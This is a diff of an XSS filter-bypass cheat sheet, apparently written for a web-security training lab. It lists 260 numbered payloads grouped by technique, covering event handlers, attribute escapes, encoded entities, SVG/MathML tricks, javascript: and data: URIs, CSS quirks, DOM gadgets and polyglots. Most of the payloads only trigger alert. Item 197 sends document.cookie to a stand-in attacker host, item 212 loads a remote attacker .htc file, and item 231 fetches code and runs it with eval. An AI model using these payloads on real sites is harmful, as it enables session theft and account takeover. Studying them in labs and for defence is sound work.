@@ -1,39 +1,278 @@
-# XSS filter bypasses — organized from easy -> hard
-# Use these on the Filter lab (select different filter levels) and on Reflected/Stored contexts.
+# XSS filter bypasses — grouped by difficulty tiers
+# Use alongside the Filter Lab and playground scenarios. Work top to bottom within each group.
 
-# Level 0: trivial (works when no filtering)
+# Group A — Basic reflections (1-40)
 1) <script>alert(1)</script>
 2) <img src=x onerror=alert(1)>
+3) <svg onload=alert(1)></svg>
+4) <iframe srcdoc="<script>alert('x')</script>"></iframe>
+5) <body onload=alert(1)>
+6) <input autofocus onfocus=alert(1)>
+7) <video><source onerror=alert(1)></video>
+8) <marquee onstart=alert(1)>hello</marquee>
+9) <details open ontoggle=alert(1)>toggle</details>
+10) <audio src onerror=alert(1)></audio>
+11) <img src=1 onerror=confirm(document.domain)>
+12) <script src=data:text/javascript,alert(1)></script>
+13) <embed src=data:text/html,<script>alert(1)</script>>
+14) <object data=data:text/html,<script>alert(1)</script>>
+15) <img srcset="x 1w" onerror=alert(1)>
+16) <img src=//example.com onload=alert(1)>
+17) <img src=javascript:alert(1)>
+18) <form onsubmit=alert(1)><input type=submit></form>
+19) <button onclick=alert(1)>Click</button>
+20) <img src=x onerror=prompt(1)>
+21) <img src=x onerror=alert(document.cookie)>
+22) <script>alert(String.fromCharCode(88,83,83))</script>
+23) <div onclick=alert(1)>Click</div>
+24) <img srcset=x onload=alert(1)>
+25) <img src=x onerror=top["al"+"ert"](1)>
+26) <img src=x onerror=alert(1)//>
+27) <img src=x onerror=alert`1`>
+28) <iframe src="javascript:alert(1)"></iframe>
+29) <svg><script>alert(1)</script></svg>
+30) <svg><animate onbegin=alert(1) attributeName=href></svg>
+31) <svg><a href=javascript:alert(1)>x</a></svg>
+32) <math><mi xlink:href="javascript:alert(1)">x</mi></math>
+33) <svg><foreignObject onload=alert(1)></foreignObject></svg>
+34) <img src onerror=alert(parent.origin)>
+35) <img src onerror=alert(name)>
+36) <img src onerror=alert(self.location)>
+37) <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+38) <img src="data:image/svg+xml,<svg onload=alert(1)></svg>">
+39) <script>open('javascript:alert(1)')</script>
+40) <svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>
 
-# Level 1: naive filter that strips <script> and on* attributes
-3) <img src=x onerror=alert(1)>  -- may be blocked by naive on* strip
-Bypass: <svg onload=alert(1)>
+# Group B — Attribute escapes & HTML trickery (41-80)
+41) " autofocus onfocus=alert(1) x="
+42) ' onmouseover=alert(1) x='
+43) " accesskey=x onclick=alert(1) "
+44) ' style="animation-name:example" onanimationstart=alert(1) '
+45) " onpointerenter=alert(1) data-x="
+46) ' draggable=true ondragstart=alert(1) '
+47) " onauxclick=alert(1) foo="
+48) ' onwheel=alert(1) foo='
+49) " onclick=alert(document.cookie) foo="
+50) ' onmouseover=confirm(1) foo='
+51) " onfocus=alert(1) autofocus="
+52) ' onmouseenter=alert(1) '
+53) " onmouseleave=alert(1) foo="
+54) ' oninput=alert(1) foo='
+55) " oninvalid=alert(1) foo="
+56) ' ontouchstart=alert(1) foo='
+57) " onpointerdown=alert(1) foo="
+58) ' onpointerup=alert(1) foo='
+59) " onpointerover=alert(1) foo="
+60) ' onpointerout=alert(1) foo='
+61) " onkeyup=alert(1) foo="
+62) ' onkeydown=alert(1) foo='
+63) " onkeypress=alert(1) foo="
+64) ' onsubmit=alert(1) foo='
+65) " formaction="javascript:alert(1)" value="submit"
+66) ' formaction="data:text/html,<script>alert(1)</script>" '
+67) " formaction=javascript:alert(1) foo="
+68) ' formaction=data:text/html,<svg/onload=alert(1)> '
+69) " x="y" onclick=alert(1) foo="
+70) ' href=javascript:alert(1) '
+71) "><img src=x onerror=alert(1)>
+72) '><img src=x onerror=alert(1)>
+73) " autofocus onfocus=confirm(1) x="
+74) ' onmouseover=prompt(1) '
+75) " style=background-image:url(javascript:alert(1)) "
+76) ' style="background:url(\6a\61\76\61\73\63\72\69\70\74:\61\6c\65\72\74(1))" '
+77) " style="-webkit-touch-callout:expression(alert(1))" "
+78) ' style="x:expression(alert(1))" '
+79) " style="filter:progid:DXImageTransform.Microsoft.BasicImage()" onfilterchange=alert(1) "
+80) ' onerror=alert`DOM` src=x '
 
-# Level 2: strip_tags() or basic tag stripping
-4) javascript:alert(1) in href
-Bypass: <a href="javascript:alert(1)">click</a>
-Better: <svg><a href="javascript:alert(1)">x</a></svg>
+# Group C — Encodings & entity bypasses (81-120)
+81) &lt;script&gt;alert(1)&lt;/script&gt;
+82) &#60;script&#62;alert(1)&#60;/script&#62;
+83) &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+84) %3Cscript%3Ealert(1)%3C/script%3E
+85) %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+86) %253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E (double encoded)
+87) &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
+88) &#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)
+89) &lt;svg onload=&amp;#97;alert(1)&gt;
+90) &lt;svg onload=&#x61;lert(1)&gt;
+91) &#000003C;svg onload=alert(1)&#000003E;
+92) &NewLine;&lt;img src=x onerror=alert(1)&gt;
+93) &Tab;&lt;img src=x onerror=alert(1)&gt;
+94) %u003cscript%u003ealert(1)%u003c/script%u003e
+95) %uff1cscript%uff1ealert(1)%uff1c/script%uff1e (fullwidth)
+96) %26lt%3Bimg%26gt%3B%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B (double HTML entity)
+97) &#x3C;img src=x onerror=alert(1)&#x3E;
+98) &lt;img src=1 onerror=alert&#40;1&#41;&gt;
+99) &#x3c;svg/onload=alert(1)&#x3e;
+100) %3Csvg%2Fonload%3Dalert(1)%3E
+101) %253Csvg%252Fonload%253Dalert(1)%253E
+102) %26%2360%3Bimg%26%2362%3B
+103) &lt;&lt;img src=x onerror=alert(1)&gt;
+104) &lt;iframe srcdoc=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&gt;
+105) &lt;script&gt;alert&amp;#x28;1&amp;#x29;&lt;/script&gt;
+106) %3Cscript%3Ealert%25281%2529%3C/script%3E
+107) &#x3c;img src="x" onerror="alert(1)"&#x3e;
+108) &#000000000060;script&#000000000062;alert(1)&#000000000060;/script&#000000000062;
+109) %25253Cscript%25253Ealert(1)%25253C%252Fscript%25253E
+110) &lt;math href=javascript:alert(1)&gt;X&lt;/math&gt;
+111) %3Cmath%20href%3Djavascript:alert(1)%3EX%3C/math%3E
+112) %3Cimg%20src%3Ddata:image/svg+xml%3Butf8%2C%253Csvg%2520onload%253Dalert(1)%253E%253C/svg%253E%3E
+113) %3Csvg%3E%3Canimate%20onbegin%3Dalert(1)%20attributeName%3Dhref%3E%3C/svg%3E
+114) %26lt%3Bsvg%26gt%3B%26lt%3Banimate%20onbegin%3Dalert(1)%26gt%3B%26lt%3B/svg%26gt%3B
+115) %3Cscript%3Etop[%22al%22+%22ert%22](1)%3C/script%3E
+116) &#x3c;script&#x3e;window['al'+'ert'](1)&#x3c;/script&#x3e;
+117) %3Cimg%20src%3Dx%20onerror%3Dalert%26lpar%3B1%26rpar%3B%3E
+118) &#x3C;img src=x onerror=alert(String.fromCharCode(49))&#x3E;
+119) %3Cimg%20src%3Dx%20onerror%3DsetTimeout(alert,0,1)%3E
+120) &lt;img src=x onerror=alert(location)&gt;
 
-# Level 3: regex removing < and > or "javascript:"
-5) %3Cscript%3Ealert(1)%3C/script%3E  (URL-encoded - if decoder runs after filter it may trigger)
-Bypass: <img src=data:image/svg+xml;charset=utf-8,%3Csvg%20onload=alert(1)%3E%3C/svg%3E>
+# Group D — SVG, MathML & mixed markup (121-160)
+121) <svg onload=alert(window.origin)></svg>
+122) <svg><desc></desc><script>alert(1)</script></svg>
+123) <svg><metadata><![CDATA[<script>alert(1)</script>]]></metadata></svg>
+124) <svg><animateMotion onbegin=alert(1) dur="1s"></svg>
+125) <svg><set attributeName=onload to="alert(1)"></svg>
+126) <svg><use xlink:href="javascript:alert(1)"></svg>
+127) <svg><discard onbegin=alert(1)></svg>
+128) <svg><animate attributeName=href begin=0s onbegin=alert(1)></svg>
+129) <svg><feImage xlink:href="javascript:alert(1)"></svg>
+130) <svg><feComponentTransfer onload=alert(1)></svg>
+131) <svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>
+132) <svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload=alert(1)></body></foreignObject></svg>
+133) <svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml" onload=alert(1)>hi</div></foreignObject></svg>
+134) <svg><script xlink:href=data:text/javascript,alert(1)></script></svg>
+135) <svg><animate attributeName=visibility to="hidden" onend=alert(1)></svg>
+136) <svg><animateTransform onbegin=alert(1) attributeName=transform></svg>
+137) <svg><animateMotion path="M0,0" onbegin=alert(1)></svg>
+138) <svg><text><tspan onstart=alert(1)>X</tspan></text></svg>
+139) <svg><animate attributeName=dur from="1s" to="2s" onrepeat=alert(1)></svg>
+140) <svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml" onclick=alert(1)>click</div></foreignObject></svg>
+141) <math><maction actiontype="statusline#alert(1)">x</maction></math>
+142) <math href="javascript:alert(1)">M</math>
+143) <math><annotation-xml encoding="application/xhtml+xml"><body onload=alert(1)></body></annotation-xml></math>
+144) <math><semantics><annotation encoding="application/xhtml+xml"><script>alert(1)</script></annotation></semantics></math>
+145) <math><mtext><svg onload=alert(1)></svg></mtext></math>
+146) <svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>
+147) <svg version="1.1"><defs><style>@keyframes boom{}</style></defs><rect onbegin=alert(1)></rect></svg>
+148) <svg><style>*{animation:boom 1s}</style><rect onanimationstart=alert(1)></rect></svg>
+149) <svg><animate attributeName=onfocus to="alert(1)" begin=0></svg>
+150) <svg><set attributeName=innerHTML to="<img src=x onerror=alert(1)>" begin=0></svg>
+151) <svg><script>alert(document.baseURI)</script></svg>
+152) <svg><script>parent['al'+'ert'](1)</script></svg>
+153) <svg><desc><![CDATA[');alert(1);//]]></desc></svg>
+154) <svg><title>" onload=alert(1) //</title></svg>
+155) <svg><animate attributeName=attributeName to="onload" begin=0 onend=alert(1)></svg>
+156) <svg><script>setTimeout('alert(1)',0)</script></svg>
+157) <svg><animate attributeName=href to="javascript:alert(1)" begin=0></svg>
+158) <svg><style><![CDATA[svg{animation:boom 1s}]]></style><rect onanimationstart=alert(1)></rect></svg>
+159) <svg><text onclick=alert(1)>Tap</text></svg>
+160) <svg><animate attributeName=visibility values="visible;visible" keyTimes="0;1" onrepeat=alert(1)></svg>
 
-# Level 4: htmlspecialchars/encoding applied server-side
-6) Use event handlers in SVG/XML entities:
-   <svg xmlns='http://www.w3.org/2000/svg'><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+# Group E — Protocol, URL & redirect tricks (161-200)
+161) javascript:alert(1)
+162) data:text/html,<script>alert(1)</script>
+163) data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
+164) data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+165) javascript:eval("alert(1)")
+166) javascript:top['al'+'ert'](1)
+167) //example.com/%2F%2F@javascript:alert(1)
+168) //evil.com/%2F..%2Fjavascript:alert(1)
+169) http://example.com/%2F%2Fjavascript:alert(1)
+170) //%0Ajavascript:alert(1)
+171) http://example.com#javascript:alert(1)
+172) https://example.com/%5cjavascript:alert(1)
+173) javascript://%0Aalert(1)
+174) javascript://%250Aalert(1)
+175) http://example.com/%09javascript:alert(1)
+176) http://example.com/%0d%0ajavascript:alert(1)
+177) javascript:alert(document.cookie)
+178) javascript:alert(document.domain)
+179) javascript:prompt(1)
+180) javascript:confirm(1)
+181) javascript:top.open('javascript:alert(1)')
+182) javascript://comment%0Aalert(1)
+183) javascript:%2f%2fcomment%0Aalert(1)
+184) javascript:alert\u00281\u0029
+185) javascript:eval(atob('YWxlcnQoMSk='))
+186) javascript:location=`javascript:alert(1)`
+187) javascript:/*payload*/alert(1)
+188) data:text/html;charset=utf-8,%3Cscript%3Ealert(1)%3C/script%3E
+189) data:text/html,<img src=x onerror=alert(1)>
+190) data:text/html,<body onload=alert(1)>
+191) data:text/html,<svg onload=alert(1)></svg>
+192) data:text/html,<iframe srcdoc="<script>alert(1)</script>">
+193) data:text/html,%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C/script%3E%22%3E
+194) data:text/plain,javascript:alert(1)
+195) data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
+196) data:text/html,<a href=javascript:alert(1)>x</a>
+197) javascript:fetch('https://attacker/?c='+document.cookie)
+198) javascript:void top.alert(1)
+199) javascript:top['ev'+'al']('alert(1)')
+200) //example.com/%01javascript:alert(1)
 
-# Level 5: Modern CSP/strong filters — DOM-only or polyglot attacks
-7) Location-based DOM XSS:
-   location.hash = '#"><img src=x onerror=alert(1)>';
-   (works if app unsafely writes location.hash via innerHTML)
-8) Polyglot SVG with data URIs:
-   <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' onload=alert(1)></svg>">
+# Group F — Style, CSS & legacy browser quirks (201-220)
+201) <div style="width:100px;height:100px;background:url(javascript:alert(1))"></div>
+202) <div style="background-image:url('javascript:alert(1)')"></div>
+203) <div style="background:url(\6a\61\76\61\73\63\72\69\70\74:alert(1))"></div>
+204) <div style="-moz-binding:url(data:text/xml,<binding xmlns='http://www.mozilla.org/xbl'><script>alert(1)</script></binding>)"></div>
+205) <div style="behavior:url(#default#AnchorClick)" onclick="javascript:alert(1)">x</div>
+206) <style>@import 'javascript:alert(1)';</style>
+207) <style>body{background:url(javascript:alert(1))}</style>
+208) <style>@font-face{font-family:x;src:url("javascript:alert(1)")}</style>
+209) <style>*{background:url(data:image/svg+xml,<svg onload=alert(1)></svg>)}</style>
+210) <div style="expression(alert(1))">IE expression</div>
+211) <style>div{width:expression(alert(1))}</style>
+212) <style>body{-ms-behavior:url(http://attacker/xss.htc)}</style>
+213) <style>div{list-style:url("javascript:alert(1)")}</style>
+214) <style>div{border-image-source:url("javascript:alert(1)")}</style>
+215) <style>div{background:url('data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+') }</style>
+216) <style>@supports selector(:has(*)){body{background:url(javascript:alert(1))}}</style>
+217) <div style="background:url(data:image/svg+xml,%3Csvg%20onload=alert(1)%3E)"></div>
+218) <div style="background-image:url(data:text/html,<script>alert(1)</script>)"></div>
+219) <style>@page{size:onload=alert(1)}</style>
+220) <style>html{clip-path:url("javascript:alert(1)")}</style>
 
-# Level 6: Advanced - Use javascript URIs in href after bypassing filters, exploiting attribute contexts, or using template engines
-9) Mutation-based DOM: createElement('img').src='data:image/svg+xml;utf8,<svg onload=alert(1)></svg>'
-10) Using backticks and template injections when app inserts into JS template strings: `);alert(1);//
+# Group G — DOM mutation & script gadgets (221-240)
+221) <script>document.body.innerHTML=location.hash</script>
+222) <script>document.write(location.search)</script>
+223) <script>eval(location.hash.slice(1))</script>
+224) <script>new Function(location.hash.slice(1))()</script>
+225) <script>setTimeout(location.hash.slice(1))</script>
+226) <script>var s=document.createElement('script');s.src=location.search.slice(1);document.head.appendChild(s);</script>
+227) <script>location.hash='</script><img src=x onerror=alert(1)>'</script>
+228) <script>let div=document.createElement('div');div.innerHTML=location.hash.slice(1);document.body.appendChild(div);</script>
+229) <script>let tpl=`${location.hash}`;document.body.innerHTML=tpl;</script>
+230) <script>let fn=new Function(`return ${location.hash.slice(1)}`);fn();</script>
+231) <script>fetch(location.hash.slice(1)).then(r=>r.text()).then(eval)</script>
+232) <script>document.querySelector('#out').innerHTML=decodeURIComponent(location.hash.slice(1));</script>
+233) <script>let url=new URL(location);document.body.innerHTML=url.searchParams.get('q');</script>
+234) <script>let msg=localStorage.payload||'';document.body.innerHTML=decodeURIComponent(msg);</script>
+235) <script>var payload=sessionStorage.p;document.body.innerHTML=payload;</script>
+236) <script>var ctx=document.location.search.substring(1);document.getElementById('target').outerHTML=ctx;</script>
+237) <script>location='javascript:'+decodeURIComponent(location.hash.slice(1))</script>
+238) <script>import(location.hash.slice(1))</script>
+239) <script>document.write(unescape(location.hash))</script>
+240) <script>document.body.innerHTML=`<img src=x onerror=alert(1)>`</script>
 
-# Notes:
-- Always test payloads in the specific context (HTML body, attribute, JS string, CSS).
-- Filters ordering matters: client-side filters are bypassable; server-side encoding is the strongest.
-- Try encoding (UTF-8 variations), nested tags, Unicode homoglyphs, and event handlers on rarely filtered tags (<svg>, <math>, <iframe> under some conditions).
+# Group H — Polyglots, mutations & exotic payloads (241-260)
+241) jaVasCript:/*--><svg/onload=alert(1)>*/
+242) "></script><svg onload=alert(1)>
+243) </script><svg onload=alert(1)>
+244) </style><img src=x onerror=alert(1)>
+245) --></script><script>alert(1)</script>
+246) ');alert(1);//
+247) `);alert(1);//
+248) ${alert(1)}
+249) "+alert(1)+"
+250) '-alert(1)-'
+251) "><img src=x onerror=alert(1)>
+252) /</title><script>alert(1)</script>
+253) "><svg><animate onbegin=alert(1) attributeName=href></svg>
+254) "><style>@keyframes boom{}</style><div style="animation:boom" onanimationstart=alert(1)></div>
+255) jaVasCript://%0Aalert(1)
+256) javascript:`${prompt(1)}`
+257) data:text/html,<svg><script>eval(location.hash.slice(1))</script></svg>
+258) javascript:/*"*/alert(1)//
+259) data:text/html,<body background="javascript:alert(1)">
+260) "}};alert(1);//
